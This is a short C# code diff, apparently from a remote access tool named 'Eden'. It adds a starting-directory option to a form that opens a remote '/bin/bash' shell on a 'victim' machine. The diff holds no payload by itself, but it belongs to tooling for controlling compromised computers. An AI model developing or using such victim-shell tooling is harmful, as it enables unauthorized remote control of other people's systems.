@@ -14,6 +14,7 @@ namespace Eden
     {
         private clsVictim m_victim { get; init; }
         private string m_szVictimID { get { return m_victim.m_szID; } }
+        private string m_szInitDir { get; init; }
 
         private enum HistoryCmd
         {
@@ -21,11 +22,12 @@ namespace Eden
             Next,
         }
 
-        public frmShell(clsVictim victim)
+        public frmShell(clsVictim victim, string szInitDir = ".")
         {
             InitializeComponent();
 
             m_victim = victim;
+            m_szInitDir = szInitDir;
         }
 
         private void fnReceived(clsClient m_clnt, string szVictimID, List<string> asMsg)
@@ -59,7 +61,7 @@ namespace Eden
                 "Shell",
                 "init",
                 "/bin/bash",
-                ".",
+                m_szInitDir,
             });
         }
 
